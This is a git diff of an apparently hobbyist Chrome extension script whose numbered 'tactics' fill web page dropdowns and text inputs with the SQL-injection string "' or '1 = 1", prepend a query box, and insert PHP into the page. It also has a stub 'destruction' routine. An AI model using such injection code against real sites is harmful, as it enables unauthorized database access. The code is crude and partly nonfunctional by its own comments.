@@ -1,5 +1,6 @@
 'use strict';
 
+// ----- Tactic 1 -----
 function dropdownInject(){
   var dropdowns = document.getElementsByTagName('select');
 
@@ -17,20 +18,24 @@ function dropdownInject(){
   alert("Injected");
 }
 
+// ----- Tactic 2 -----
 function tfInject(){
   var tfs = document.getElementsByTagName('input');
-  var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
+  var injectionString = "\' or \'1 = 1"
   for (var i = 0; i < tfs.length; i++){
     tfs[i].value = injectionString;
   }
 }
 
+// ----- Tactic 3 -----
 function idTable(){
+  // Not very feasable
   var listeners = getEventListeners();
-  //WIP
 }
 
+// ----- Tactic 4 -----
 function customScriptBox(){
+  // Adds to the website but not really useful as PHP only runs server side
   var originalHTML = document.getElementsByTagName('body');
   var scriptbox = 'Insert Query Here: <input id=\"customquery\"></input> <button id=\"csb\">Submit</button>';
   originalHTML[0].innerHTML = scriptbox + originalHTML[0].innerHTML; 
@@ -38,17 +43,22 @@ function customScriptBox(){
 }
 
 function runcs(){
+  // Adds to the website but not really useful as PHP only runs server side
   var query = document.getElementById('customquery');
   var phpblock1 = "<?php";
   var phpblock2 = "echo(did the php work);";
   var phpblock3 = "?>";
   var originalHTML = document.getElementsByTagName('body');
   originalHTML[0].innerHTML = phpblock1 + phpblock2 + phpblock3 + originalHTML[0].innerHTML;
-  //alert(query.value);
-  
+}
+
+// ----- Tactic 5 -----
+function destruction(){
+  // Not very feasable, at least not as intended
 }
 
 
+// Selection of injection stradegy
 chrome.runtime.onMessage.addListener(
   function(request, sender, sendResponse) {
     if (request.message === "inject_to_dropdowns"){
@@ -65,7 +75,7 @@ chrome.runtime.onMessage.addListener(
       customScriptBox();
     }
     else if (request.message === "destruction"){
-      alert("Crush Kill Destory");
+      destruction();
     }
   }
 );
